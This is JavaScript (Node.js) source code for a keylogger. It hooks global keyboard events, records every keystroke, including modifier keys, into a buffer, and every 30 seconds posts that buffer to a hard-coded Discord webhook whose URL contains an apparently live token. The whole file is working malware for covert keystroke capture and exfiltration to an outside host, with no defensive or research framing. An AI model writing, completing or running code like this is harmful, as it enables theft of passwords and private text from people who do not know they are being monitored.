// import {GlobalKeyboardListener} from "node-global-key-listener";
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const axios = require('axios')

const v = new GlobalKeyboardListener();

var l_shift_dn = false;
var l_alt_dn = false
var l_ctrl_dn = false
var keylogs = '';


//Log every key that's pressed.
v.addListener(function (e, down) {
  if (e.state == "UP") {
    switch (e.name) {
      case 'LEFT SHIFT':
        keylogs += '</L.SHIFT>'
        process.stdout.write('</L.SHIFT>');
        l_shift_dn = false
        break;

      case 'RIGHT SHIFT':
        keylogs += '</R.SHIFT>'
        process.stdout.write('</R.SHIFT>');
        l_shift_dn = false
        break;

      case 'LEFT CTRL':
        keylogs += '</L.CTRL>'
        process.stdout.write('</L.CTRL>');
        l_ctrl_dn = false
        break;

      case 'RIGHT CTRL':
        keylogs += '</R.CTRL>'
        process.stdout.write('</R.CTRL>');
        l_ctrl_dn = false
        break;

      case 'RIGHT ALT':
        keylogs += '</R.ALT>'
        process.stdout.write('</R.ALT>');
        l_alt_dn = false
        break;

      case 'LEFT ALT':
        keylogs += '</L.ALT>'
        process.stdout.write('</L.ALT>');
        l_alt_dn = false
        break;

      case 'SPACE':
        process.stdout.write(' ');
        keylogs += ' '
        break;

      case 'BACKSPACE':
        process.stdout.write('<BACKSPACE>');
        keylogs += '<BACKSPACE>'
        break;

      case 'SQUARE BRACKET CLOSE':
        process.stdout.write(']');
        keylogs += '<BRACKET>'
        break;

      case 'SQUARE BRACKET OPEN':
        process.stdout.write('[');
        keylogs += '<BRACKET>'
        break;

      case 'SEMICOLON':
        process.stdout.write(';');
        keylogs += ';'
        break;

      case 'QUOTE':
        process.stdout.write('<QUOTE>');
        keylogs += '<QUOTE>'
        break;

      case 'BACKSLASH':
        process.stdout.write('\\');
        keylogs += '<BACKSLASH>'
        break;

      case 'PAGE UP':
        process.stdout.write('<PAGE_UP>');
        keylogs += '<PAGE_UP>'
        break;

      case 'PAGE DOWN':
        process.stdout.write('<PAGE_DOWN>');
        keylogs += '<PAGE_DOWN>'
        break;

      case 'INS':
        process.stdout.write('<INS>');
        keylogs += '<INS>'
        break;

      case 'DELETE':
        process.stdout.write('<DELETE>');
        keylogs += '<DELETE>'
        break;

      case 'PRINT SCREEN':
        process.stdout.write('<PRINT_SCREEN>');
        keylogs += '<PRINT_SCREEN>'
        break;

        case 'END':
          process.stdout.write('<END>');
          keylogs += '<END>'
          break;


      case 'TAB':
        process.stdout.write('<TAB>');
        keylogs += '<TAB>'
        break;

      case 'RETURN':
        process.stdout.write('<ENTER>');
        keylogs += '<ENTER>'
        break;

      case 'SECTION':
        process.stdout.write('<BACK_TICK>');
        keylogs += '<BACK_TICK>'
        break;

      case 'UP_ARROW':
        process.stdout.write('<UP_ARROW>');
        keylogs += '<UP_ARROW>'
        break;

      case 'DOWN_ARROW':
        process.stdout.write('<DOWN_ARROW>');
        keylogs += '<DOWN_ARROW>'
        break;

      case 'RIGHT_ARROW':
        process.stdout.write('<RIGHT_ARROW>');
        keylogs += '<RIGHT_ARROW>'
        break;

      case 'LEFT_ARROW':
        process.stdout.write('<LEFT_ARROW>');
        keylogs += '<LEFT_ARROW>'
        break;

      case 'LEFT META':
        process.stdout.write('<WINDOWS_ICON>');
        keylogs += '<WINDOWS_ICON>'
        break;

      case 'DOT':
        process.stdout.write('.');
        keylogs += '.'
        break;

      case 'COMMA':
        process.stdout.write(',');
        keylogs += ','
        break;

      case 'FORWARD SLASH':
        process.stdout.write('/');
        keylogs += '/'
        break;

      case 'CAPSLOCK':
        process.stdout.write('<CAPSLOCK>');
        keylogs += '<CAPSLOCK>'
      break

      case 'MINUS':
        process.stdout.write('-');
        keylogs += '-'
      break

      case 'EQUALS':
        process.stdout.write('=');
        keylogs += '='
      break

      default:
        keylogs += e.name
        process.stdout.write(e.name);
        break;

    }
  } else if (e.state == "DOWN") {
    switch (e.name) {
      case 'LEFT SHIFT':
        if (l_shift_dn == false) {
          keylogs += '<L.SHIFT>'
          process.stdout.write('<L.SHIFT>');
          l_shift_dn = true
        }
        break;

      case 'RIGHT SHIFT':
        if (l_shift_dn == false) {
          keylogs += '<R.SHIFT>'
          process.stdout.write('<R.SHIFT>');
          l_shift_dn = true
        }
        break;

      case 'LEFT ALT':
        if (l_alt_dn == false) {
          keylogs += '<L.ALT>'
          process.stdout.write('<L.ALT>');
          l_alt_dn = true
        }
        break;

      case 'RIGHT ALT':
        if (l_alt_dn == false) {
          keylogs += '<R.ALT>'
          process.stdout.write('<R.ALT>');
          l_alt_dn = true
        }
        break;

      case 'RIGHT CTRL':
        if (l_ctrl_dn == false) {
          keylogs += '<R.CTRL>'
          process.stdout.write('<R.CTRL>');
          l_ctrl_dn = true
        }
        break;

      case 'LEFT CTRL':
        if (l_ctrl_dn == false) {
          keylogs += '<L.CTRL>'
          process.stdout.write('<L.CTRL>');
          l_ctrl_dn = true
        }
        break;

    }
  }
});

setInterval(async () => {
  await axios.post('https://discord.com/api/webhooks/1236143004042006608/YWmFgvWRauzPPWvTnLucrotNeHeTJfUbOiHZKCbQcxyrRS_oDWuF1MBqStH73gbGK-ju', {
    "content": keylogs,
  })

}, 1000 * 30)


